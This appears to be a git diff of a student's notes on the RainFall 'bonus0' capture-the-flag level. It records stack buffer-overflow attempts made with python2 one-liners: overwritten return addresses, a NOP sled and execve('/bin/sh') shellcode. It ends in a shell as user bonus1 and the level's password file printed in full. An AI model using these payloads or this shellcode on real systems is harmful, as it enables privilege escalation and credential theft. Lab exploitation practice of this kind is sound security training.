@@ -170,28 +170,11 @@ GROSCRACK -> pour recuperer au bonne endroit la string
 
 ----------
 
-0xbffffec9 + a = 0xbffffed3
-\xc5\xfe\xff\xbf
-
-14 14 + 10 
-  f
-
-c9 + 10
-d4  + 4
-
-"\\xd3\\xfe\\xff\\xbf"
-"\xd3\xfe\xff\xbf"
 
 
-AAAAAAAAAAA\xc5\xfe\xff\xbf
- - 
-BBBBBBBBBBBBBBBB\\xd3\\xfe\\xff\\xbf
-
-BBBBCCCCDDDDEEEEFFFF
-BBBBCCCCD\xc5\xfe\xff\xbf
 
 
-bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("BBBBCCCCDDDDE" + "\xd3\xfe\xff\xbf")'); cat)) | ./bonus0
+bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("BBBBBBBBBBBBBBBB" + "\x80\xf8\xff\xbf")'); cat)) | ./bonus0
  - 
  - 
 AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDE���� BBBBCCCCDDDDE����
@@ -303,3 +286,26 @@ ec - d8
 (echo "$(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\x0a" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n" )')"))
 
 (echo "$(python2 -c 'import sys; sys.stdout.write( "\n" "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')"; cat) | ./bonus0
+
+
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
+
+< <(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x80\xf8\xff\xbf" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"))
+
+< <(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 500 + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "FFFF" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"))
+
+< <(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x40\xe6\xff\xbf" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"))
+
+0xbfffe640
+
+
+bonus0@RainFall:~$ (echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x40\xe6\xff\xbf" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"); cat) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBCCCCD@���BBBBBBB��� BBBBCCCCD@���BBBBBBB���
+id
+uid=2011(bonus1) gid=2010(bonus0) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+pwd            
+/home/user/bonus0
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
